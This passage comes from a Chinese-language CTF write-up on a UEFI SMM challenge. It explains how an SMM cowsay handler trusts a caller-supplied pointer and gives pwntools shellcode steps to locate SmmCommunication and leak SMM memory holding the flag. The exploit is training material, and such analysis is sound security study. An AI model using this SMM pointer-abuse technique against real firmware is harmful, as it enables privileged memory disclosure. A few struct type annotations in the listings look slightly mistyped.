class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_TABLE_HEADER                 Hdr;</span><br><span class="line">  CHAR16                           *FirmwareVendor;</span><br><span class="line">  UINT32                           FirmwareRevision;</span><br><span class="line">  EFI_HANDLE                       ConsoleInHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_INPUT_PROTOCOL   *ConIn;</span><br><span class="line">  EFI_HANDLE                       ConsoleOutHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL  *ConOut;</span><br><span class="line">  EFI_HANDLE                       StandardErrorHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL  *StdErr;</span><br><span class="line">  EFI_RUNTIME_SERVICES             *RuntimeServices;</span><br><span class="line">  EFI_BOOT_SERVICES                *BootServices;</span><br><span class="line">  UINTN                            NumberOfTableEntries;</span><br><span class="line">  EFI_CONFIGURATION_TABLE          *ConfigurationTable;</span><br><span class="line">&#125; EFI_SYSTEM_TABLE;</span><br></pre></td></tr></table></figure><p>我们现在感兴趣的是 EFI 系统表的 <code>BootServices</code> 字段，它保存指向 EFI 引导服务表的指针（参阅<a href="https://uefi.org/specs/UEFI/2.10/04_EFI_System_Table.html#efi-boot-services-table">EFI System Table — UEFI Specification documentation</a>）：另一个表保存一堆针对不同 UEFI API 的有用函数指针。</p><blockquote><p>UEFI uses the EFI Boot Services Table, which contains a table header and pointers to all of the boot services. The definition for this table is shown in the following code fragments. Except for the table header, all elements in the EFI Boot Services Tables are prototypes of function pointers to functions as defined in <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#services-boot-services">Services — Boot Services</a> . The function pointers in this table are not valid after the operating system has taken control of the platform with a call to <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-exitbootservices">EFI_BOOT_SERVICES.ExitBootServices()</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BOOT_SERVICES_SIGNATURE 0x56524553544f4f42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BOOT_SERVICES_REVISION EFI_SPECIFICATION_VERSION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_TABLE_HEADER     Hdr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Task Priority Services</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  EFI_RAISE_TPL        RaiseTPL;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">  EFI_RESTORE_TPL      RestoreTPL;     <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Memory Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_ALLOCATE_PAGES   AllocatePages;  <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_FREE_PAGES       FreePages;      <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_GET_MEMORY_MAP   GetMemoryMap;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_ALLOCATE_POOL    AllocatePool;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_FREE_POOL        FreePool;       <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Event &amp; Timer Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CREATE_EVENT     CreateEvent;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SET_TIMER        SetTimer;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_WAIT_FOR_EVENT   WaitForEvent;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SIGNAL_EVENT     SignalEvent;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_CLOSE_EVENT      CloseEvent;     <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_CHECK_EVENT      CheckEvent;     <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Protocol Handler Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_INSTALL_PROTOCOL_INTERFACE     InstallProtocolInterface;            <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_REINSTALL_PROTOCOL_INTERFACE   ReinstallProtocolInterface;          <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_UNINSTALL_PROTOCOL_INTERFACE   UninstallProtocolInterface;          <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_HANDLE_PROTOCOL                HandleProtocol;                      <span class="comment">// EFI 1.0+</span></span><br><span class="line"> VOID*   Reserved;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_REGISTER_PROTOCOL_NOTIFY       RegisterProtocolNotify;              <span class="comment">// EFI  1.0+</span></span><br><span class="line">    EFI_LOCATE_HANDLE                  LocateHandle;                        <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_LOCATE_DEVICE_PATH             LocateDevicePath;                    <span class="comment">// EFI 1.0+</span></span><br><span class="line"> EFI_INSTALL_CONFIGURATION_TABLE       InstallConfigurationTable;           <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Image Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_IMAGE_UNLOAD               LoadImage;        <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_IMAGE_START                StartImage;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_EXIT                       Exit;             <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_IMAGE_UNLOAD               UnloadImage;      <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_EXIT_BOOT_SERVICES         ExitBootServices; <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Miscellaneous Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_GET_NEXT_MONOTONIC_COUNT   GetNextMonotonicCount; <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_STALL                      Stall;                 <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SET_WATCHDOG_TIMER         SetWatchdogTimer;      <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// DriverSupport Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CONNECT_CONTROLLER         ConnectController;     <span class="comment">// EFI 1.1</span></span><br><span class="line">    EFI_DISCONNECT_CONTROLLER      DisconnectController;  <span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Open and Close Protocol Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_OPEN_PROTOCOL              OpenProtocol;           <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_CLOSE_PROTOCOL             CloseProtocol;          <span class="comment">// EFI 1.1+</span></span><br><span class="line"> EFI_OPEN_PROTOCOL_INFORMATION     OpenProtocolInformation;<span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Library Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_PROTOCOLS_PER_HANDLE       ProtocolsPerHandle;     <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_LOCATE_HANDLE_BUFFER       LocateHandleBuffer;     <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_LOCATE_PROTOCOL            LocateProtocol;         <span class="comment">// EFI 1.1+</span></span><br><span class="line">  EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES  InstallMultipleProtocolInterfaces;    <span class="comment">// EFI 1.1+</span></span><br><span class="line">  EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES UninstallMultipleProtocolInterfaces;   <span class="comment">// EFI 1.1+*</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 32-bit CRC Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CALCULATE_CRC32    CalculateCrc32;     <span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Miscellaneous Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_COPY_MEM           CopyMem;        <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_SET_MEM            SetMem;         <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_CREATE_EVENT_EX    CreateEventEx;  <span class="comment">// UEFI 2.0+</span></span><br><span class="line">  &#125; EFI_BOOT_SERVICES;</span><br></pre></td></tr></table></figure><h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>尝试一下执行shellcode</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ pwn asm -c amd64 <span class="string">&#x27;mov rax, qword ptr [0x44440000]; mov rbx, qword ptr [0x44440008]&#x27;</span></span><br><span class="line">488b042500004444488b1c2508004444</span><br><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">488b042500004444488b1c2508004444</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">Running...</span><br><span class="line">RAX: 0x6E7B667463756975 RBX: 0x2179727420656369 RCX: 0x0000000000000000</span><br><span class="line">...</span><br><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">$ python3</span><br><span class="line">&gt;&gt;&gt; (0x6E7B667463756975).to_bytes(8, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">b<span class="string">&#x27;uiuctf&#123;n&#x27;</span></span><br><span class="line">&gt;&gt;&gt; (0x2179727420656369).to_bytes(8, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">b<span class="string">&#x27;ice try!&#x27;</span></span><br></pre></td></tr></table></figure><p>QEMU 补丁按预期工作：MMIO 驱动程序发现我们没有从系统管理模式读取内存，并给了我们假标志。即使我们确实可以访问物理内存，我们仍然无法通过在 <code>Binexec.efi</code> 驱动程序中运行代码来读取该标志。我们需要从系统管理模式中读取它。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>题目给出了打在uefishell上的patch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+VOID</span><br><span class="line">+Cowsay (</span><br><span class="line">+  IN CONST CHAR16 *Message</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line">+</span><br><span class="line">+  Buffer = AllocateRuntimeZeroPool(<span class="keyword">sizeof</span>(*Buffer) + <span class="keyword">sizeof</span>(CHAR16 *));</span><br><span class="line">+  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+</span><br><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = <span class="keyword">sizeof</span>(CHAR16 *);</span><br><span class="line">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line">+</span><br><span class="line">+  mSmmCommunication-&gt;Communicate(</span><br><span class="line">+    mSmmCommunication,</span><br><span class="line">+    Buffer,</span><br><span class="line">+    <span class="literal">NULL</span></span><br><span class="line">+  );</span><br></pre></td></tr></table></figure><p>如上所述，普通 UEFI 驱动程序可以通过此“SmmCommunication”协议与注册了适当处理程序的 SMM UEFI 驱动程序进行通信，并且数据通过指向 <code>EFI_SMM_COMMUNICATE_HEADER</code> 结构的指针传递：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_GUID HeaderGuid;</span><br><span class="line">  UINTN MessageLength;</span><br><span class="line">  UINT8 Data[ANYSIZE_ARRAY];</span><br><span class="line">&#125; EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure><p>注意到传递的消息实质上一个指针</p><p><code>*(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</code></p><p>在这种情况下，发送的消息只是一个指针，它按原样复制到 <code>-&gt;Data</code> 数组成员中。换句话说， <code>Binexec.efi</code> 发送一个指向要通过 <code>mSmmCommunication-&gt;Communicate</code> 打印到 <code>SmmCowsay.efi</code> 的字符串的指针。如果我们看一下 <code>SmmCowsay.efi</code> 处理指针，我们可以看到它没有以任何特殊方式处理。它只是按原样传递给打印函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCowsayHandler</span> <span class="params">(</span></span><br><span class="line"><span class="params">    IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="params">    IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">    IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">    IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">    )</span></span><br><span class="line">&#123;</span><br><span class="line">    DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; <span class="keyword">sizeof</span>(CHAR16 *))</span><br><span class="line">        <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line"></span><br><span class="line">    Cowsay(*(CONST CHAR16 **)CommBuffer); <span class="comment">// &lt;== pointer passed *as is* here</span></span><br><span class="line"></span><br><span class="line">    DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味着我们可以将任意指针传递给 <code>SmmCowsay</code> 驱动程序，它会很乐意为我们读取给定地址处的内存，并将其显示在控制台上，就像它是一个以 NUL 结尾的 <code>CHAR16</code> 的 <code>EFI_SMM_COMMUNICATE_HEADER</code> ，并通过 <code>mSmmCommunication-&gt;Communicate</code> 将其传递给 SMM 驱动程序，我们可以将其获取为我们打印旗帜！</p><p>但是我们如何获得这个“SmmCommunication”协议来调用它的 <code>-&gt;Communicate()</code> 方法呢？看一下 <code>Binexec.efi</code> 中的代码， <code>mSmmCommunication</code> 只是将正确的 GUID 传递给 <code>BootServices-&gt;LocateProtocol()</code> 获得的指针，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gBS-&gt;LocateProtocol(</span><br><span class="line">    &amp;gEfiSmmCommunicationProtocolGuid,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (VOID **)&amp;mSmmCommunication</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>那么我们现在需要做的就是想办法调用cowsay,并将flag的地址作为参数传送</p><p>我们需要得到 <code>SystemTable-&gt;BootServices-&gt;LocateProtocol</code> 。理论上，由于 EDK2 没有应用 ASLR，所有地址在我们的工作环境（本地和远程）中都是固定的，因此我们可以获取我们需要的任何函数的地址并直接调用</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="Step-1-get-LocateProtocol"><a href="#Step-1-get-LocateProtocol" class="headerlink" title="Step 1: get LocateProtocol"></a>Step 1: get LocateProtocol</h4><p><code>LocateProtocol</code> 函数在 <code>BootServices</code> 表 ( <code>gBS</code> ) 中提供，实际上我们在 <code>SystemTable</code> 中有一个指针。我们知道 <code>SystemTable</code> 的地址，因为程序将其打印到控制台了,但实际上因为edk2不支持任何aslr技术,所以哪怕不给,也能够调试获得</p><p>我们看LocateProtocol函数,其可以根据给定guid定位到protocol或者服务的地址,并将其存储在r8指向的空间(返回一个指向protocol的指针)</p><blockquote><p><strong>Summary</strong></p><p>Returns the first protocol instance that matches the given protocol.</p><p><strong>Prototype</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI *EFI_LOCATE_PROTOCOL) (</span><br><span class="line">  IN EFI_GUID                            *Protocol,</span><br><span class="line">  IN VOID                                *Registration OPTIONAL,</span><br><span class="line">  OUT VOID                               **Interface</span><br><span class="line"> );</span><br></pre></td></tr></table></figure><p><strong>Parameters</strong></p><ul><li><p>Protocol</p><p>Provides the protocol to search for.</p></li><li><p>Registration</p><p>Optional registration key returned from <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html?highlight=locateprotocol#efi-boot-services-registerprotocolnotify">EFI_BOOT_SERVICES.RegisterProtocolNotify()</a> . If <em>Registration</em> is NULL, then it is ignored.</p></li><li><p>Interface</p><p>On return, a pointer to the first interface that matches <em>Protocol</em> and <em>Registration</em>.</p></li></ul><p><strong>Description</strong></p><p>The <strong>LocateProtocol</strong>() function finds the first device handle that support <em>Protocol</em>, and returns a pointer to the protocol interface from that handle in <em>Interface</em>. If no protocol instances are found, then <em>Interface</em> is set to NULL.</p><p>If <em>Interface</em> is NULL, then EFI_INVALID_PARAMETER is returned.</p><p>If <em>Protocol</em> is NULL, then EFI_INVALID_PARAMETER is returned.</p><p>If <em>Registration</em> is NULL, and there are no handles in the handle database that support <em>Protocol</em>, then EFI_NOT_FOUND is returned.</p><p>If <em>Registration</em> is not NULL, and there are no new handles for <em>Registration</em>, then EFI_NOT_FOUND is returned.</p><p><strong>Status Codes Returned</strong></p><div class="table-container"><table><thead><tr><th>EFI_SUCCESS</th><th>A protocol instance matching <em>Protocol</em> was found and returned in <em>Interface</em>.</th></tr></thead><tbody><tr><td>EFI_INVALID_PARAMETER</td><td><em>Interface</em> is NULL. <em>Protocol</em> is NULL.</td></tr><tr><td>EFI_NOT_FOUND</td><td>No protocol instances were found that match Protocol and <em>Registration</em>.</td></tr></tbody></table></div></blockquote><p>我们首先通过几个简单的mov获得protocol的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;system_table&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]  /* SystemTable-&gt;BootServices */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 64]  /* BootServices-&gt;AllocatePool */</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 320] /* BootServices-&gt;LocateProtocol */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>) <span class="comment"># useful for later</span></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;BootServices-&gt;AllocatePool   @ 0x%x&#x27;</span>, AllocatePool)</span><br><span class="line">log.success(<span class="string">&#x27;BootServices-&gt;LocateProtocol @ 0x%x&#x27;</span>, LocateProtocol)</span><br></pre></td></tr></table></figure><p>可以看到我们还获取了一个指针<code>BootServices-&gt;AllocatePool</code>,这个之后再说</p><h4 id="Step-2-get-mSmmCommunication"><a href="#Step-2-get-mSmmCommunication" class="headerlink" title="Step 2: get mSmmCommunication"></a>Step 2: get mSmmCommunication</h4><p>现在为了定位 <code>mSmmCommunication</code> 我们需要将一个指向协议 GUID 的指针传递给 <code>LocateProtocol</code> ，以及一个指向应存储结果指针的位置的指针。我们已经有一个可用的 RWX 内存区域（编写 shellcode 的区域），所以我们使用它。</p><p>此外,EDK2 的补丁 <code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code> 将页表的所有条目设置为 RWX : )</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Taken from EDK2 source code (or opening Binexec.efi in a disassembler)</span></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;mSmmCommunication              @ 0x%x&#x27;</span>, mSmmCommunication)</span><br><span class="line">log.success(<span class="string">&#x27;mSmmCommunication-&gt;Communicate @ 0x%x&#x27;</span>, Communicate)</span><br></pre></td></tr></table></figure><h4 id="Step-3-getflag"><a href="#Step-3-getflag" class="headerlink" title="Step 3: getflag"></a>Step 3: getflag</h4><p>现在，我们可以为 <code>SmmCowsay</code> 制作一条消息，其中包含指向标志的指针，并让它通过使用正确的参数调用 <code>mSmmCommunication-&gt;Communicate</code> 来为我们打印它。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Taken from 0003-SmmCowsay-Vulnerable-Cowsay.patch</span></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, &amp;buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span 